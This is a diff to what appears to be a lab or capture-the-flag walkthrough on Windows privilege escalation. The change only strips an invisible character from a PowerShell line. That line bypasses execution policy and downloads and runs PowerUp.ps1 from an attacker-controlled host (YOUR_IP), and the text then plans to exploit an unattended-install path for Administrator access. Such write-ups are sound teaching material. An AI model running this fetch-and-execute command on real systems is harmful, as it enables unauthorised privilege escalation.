@@ -96,7 +96,7 @@ We will run [PowerUp1.ps1](https://raw.githubusercontent.com/PowerShellEmpire/Po
 
 ```
 powershell -ep bypass;
-iex​(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1') 
+iex(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1') 
 ```
 
 The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.
